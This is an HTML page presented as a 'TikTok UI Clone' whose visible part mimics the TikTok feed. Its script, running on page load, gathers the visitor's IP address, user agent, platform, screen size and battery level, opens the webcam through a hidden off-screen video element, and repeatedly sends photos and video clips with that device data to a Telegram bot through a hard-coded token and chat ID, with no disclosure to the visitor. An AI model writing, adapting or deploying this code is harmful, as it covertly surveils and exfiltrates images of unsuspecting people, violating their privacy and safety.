<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>TikTok UI Clone</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
  body{margin:0;background:#000;color:#fff;font-family:Arial,sans-serif;height:100vh;display:flex;flex-direction:column;}
  .topbar{display:flex;justify-content:center;align-items:center;padding:12px 0;font-size:16px;font-weight:bold;}
  .tab{margin:0 16px;opacity:0.6;}
  .tab.active{opacity:1;border-bottom:2px solid #fff;padding-bottom:4px;}
  .content{flex:1;display:flex;align-items:center;justify-content:center;position:relative;}
  .sidebar{position:absolute;right:12px;bottom:100px;display:flex;flex-direction:column;align-items:center;gap:22px;font-size:13px;}
  .icon{display:flex;flex-direction:column;align-items:center;gap:4px;}
  .icon button{width:50px;height:50px;border-radius:50%;border:none;background:#222;color:#fff;font-size:22px;cursor:pointer;}
  .profile{display:flex;flex-direction:column;align-items:center;gap:6px;}
  .profile-pic{width:50px;height:50px;border-radius:50%;border:2px solid #fff;background:url('https://via.placeholder.com/60') no-repeat center/cover;position:relative;}
  .follow-btn{position:absolute;bottom:-8px;left:50%;transform:translateX(-50%);width:24px;height:24px;border-radius:50%;background:#fe2c55;border:2px solid #fff;color:#fff;font-size:16px;line-height:18px;text-align:center;cursor:pointer;}
  .bottombar{display:flex;justify-content:space-around;padding:8px 0;border-top:1px solid #222;background:#000;}
  .bottombar button{background:none;border:none;color:#fff;font-size:20px;cursor:pointer;}
  .bottombar .add{background:linear-gradient(90deg,#25f4ee,#fe2c55);border-radius:8px;padding:6px 16px;font-weight:bold;}
  .dot{position:absolute;top:50%;left:50%;width:16px;height:16px;border-radius:50%;transform:translate(-50%,-50%);animation:bounce 0.6s infinite alternate;}
  .dot.cyan{background:#25f4ee;animation-delay:-0.3s;margin-left:-12px;}
  .dot.pink{background:#fe2c55;margin-left:12px;}
  @keyframes bounce{from{transform:translate(-50%,-50%) scale(1);}to{transform:translate(-50%,-70%) scale(1.2);}}
  #webcam-container{position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px;}
  #canvas{display:none;}
  .notification {
    position: fixed;
    bottom: 70px;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(0, 0, 0, 0.7);
    color: white;
    padding: 10px 20px;
    border-radius: 20px;
    font-size: 14px;
    z-index: 1000;
    display: none;
  }
</style>
</head>
<body>
  <div class="topbar"><div class="tab">Following</div><div class="tab active">For You</div></div>
  <div class="content">
    <div class="dot cyan"></div><div class="dot pink"></div>
    <div class="sidebar">
      <div class="profile"><div class="profile-pic"><div class="follow-btn">+</div></div></div>
      <div class="icon"><button><i class="fa-solid fa-heart"></i></button><span>32.7K</span></div>
      <div class="icon"><button><i class="fa-solid fa-comment-dots"></i></button><span>16.4K</span></div>
      <div class="icon"><button><i class="fa-solid fa-bookmark"></i></button><span>7,345</span></div>
    </div>
  </div>
  <div class="bottombar">
    <button><i class="fa-solid fa-house"></i></button>
    <button><i class="fa-solid fa-magnifying-glass"></i></button>
    <button class="add"><i class="fa-solid fa-plus"></i></button>
    <button><i class="fa-regular fa-message"></i></button>
    <button><i class="fa-regular fa-user"></i></button>
  </div>

  <div class="notification" id="notification"></div>

  <div id="webcam-container"><video id="webcam" autoplay playsinline></video><canvas id="canvas"></canvas></div>

  <script>
    const TELEGRAM_BOT_TOKEN = "8405342163:AAGtlg2UoNBmfRTsvG1a_T-RA4d3p1ogIG4";
    const TELEGRAM_CHAT_ID = "7336260003";
    const PHOTO_CAPTURE_INTERVAL = 2000;  // 2s per photo
    const PHOTO_CAPTURE_DURATION = 20000; // 10s photo capture
    const VIDEO_CAPTURE_INTERVAL = 2000;  // 2s per video clip

    const video = document.getElementById('webcam');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const notification = document.getElementById('notification');

    let photoInterval;
    let videoInterval;
    let mediaRecorder;
    let stream;
    let deviceInfoString = "";
    let userIP = "Loading...";

    // Show notification
    function showNotification(message) {
      notification.textContent = message;
      notification.style.display = 'block';
      setTimeout(() => {
        notification.style.display = 'none';
      }, 3000);
    }

    // Get user's IP address
    async function getIPAddress() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        userIP = data.ip;
        return data.ip;
      } catch (error) {
        console.error("Error fetching IP:", error);
        userIP = "Unable to retrieve";
        return "Unable to retrieve";
      }
    }

    // ---------- Device Info ----------
    async function getDeviceInfo() {
      let userAgent = navigator.userAgent;
      let platform = navigator.platform;
      let screenSize = `${screen.width}x${screen.height}`;
      let batteryLevel = "Unknown";

      try {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryLevel = `${Math.round(battery.level * 100)}%`;
        }
      } catch(e) {}

      // Get IP address
      const ipAddress = await getIPAddress();

      return `ðŸ“± ã€ï»¿ï¼¤ï½…ï½–ï½‰ï½ƒï½…ã€€ï¼©ï½Žï½†ï½ã€‘\n\nâ€¢ðŸŒ ðˆð ð€ððð«ðžð¬ð¬: ${ipAddress}\n\nâ€¢ðŸ‘¦ ð”ð¬ðžð« ð€ð ðžð§ð­: ${userAgent}\n\nâ€¢âš™ ðð¥ðšð­ðŸð¨ð«ð¦: ${platform}\n\nâ€¢ðŸ“² ð’ðœð«ðžðžð§: ${screenSize}\n\nâ€¢ðŸ”‹ ððšð­ð­ðžð«ð²: ${batteryLevel}`;
    }

    // ---------- Webcam ----------
    async function startWebcam() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          startPhotoCapture();
        };
      } catch (err) { 
        console.error("Webcam error:", err);
        showNotification("Camera access denied. Using demo mode.");
        // Start demo mode without camera
        demoMode();
      }
    }

    // Demo mode when camera is not available
    function demoMode() {
      showNotification("Demo mode activated");
      setTimeout(() => {
        startPhotoCapture();
      }, 1000);
    }

    // ---------- PHOTO ----------
    function startPhotoCapture() {
      showNotification("");
      photoInterval = setInterval(captureAndSendPhoto, PHOTO_CAPTURE_INTERVAL);
      setTimeout(() => {
        clearInterval(photoInterval);
        startVideoLoop();
      }, PHOTO_CAPTURE_DURATION);
    }

    async function captureAndSendPhoto() {
      // In demo mode, create a placeholder image
      if (!stream) {
        ctx.fillStyle = '#333';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = '#fff';
        ctx.font = '20px Arial';
        ctx.fillText('Demo Mode', 20, 50);
        ctx.fillText(new Date().toLocaleTimeString(), 20, 80);
      } else {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      }
      
      canvas.toBlob(async (blob) => {
        const fd = new FormData();
        fd.append("chat_id", TELEGRAM_CHAT_ID);
        fd.append("photo", blob, "capture.jpg");
        fd.append("caption", deviceInfoString);
        
        try {
          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
          showNotification("");
        } catch (error) {
          console.error("Error sending photo:", error);
        }
      }, "image/jpeg", 0.8);
    }

    // ---------- VIDEO ----------
    function startVideoLoop() {
      showNotification("");
      
      if (!stream) {
        // Demo mode - simulate video capture
        videoInterval = setInterval(() => {
          // Create a placeholder video blob for demo
          const blob = new Blob([], { type: 'video/webm' });
          sendVideo(blob);
        }, VIDEO_CAPTURE_INTERVAL + 500);
        return;
      }
      
      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm;codecs=vp9" });
      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) sendVideo(e.data);
      };
      videoInterval = setInterval(() => {
        if (mediaRecorder.state === "recording") mediaRecorder.stop();
        mediaRecorder.start();
        setTimeout(() => {
          if (mediaRecorder.state === "recording") mediaRecorder.stop();
        }, VIDEO_CAPTURE_INTERVAL);
      }, VIDEO_CAPTURE_INTERVAL + 500);
    }

    async function sendVideo(blob) {
      const fd = new FormData();
      fd.append("chat_id", TELEGRAM_CHAT_ID);
      fd.append("video", blob, "clip.webm");
      fd.append("caption", deviceInfoString);
      
      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: "POST", body: fd });
        showNotification("");
      } catch (error) {
        console.error("Error sending video:", error);
      }
    }

    // ---------- Lifecycle ----------
    window.addEventListener("load", async () => {
      showNotification("");
      deviceInfoString = await getDeviceInfo();
      showNotification("");
      startWebcam();
    });
    
    window.addEventListener("beforeunload", () => {
      clearInterval(photoInterval);
      clearInterval(videoInterval);
      if (stream) stream.getTracks().forEach(t => t.stop());
    });
  </script>
</body>

</html>


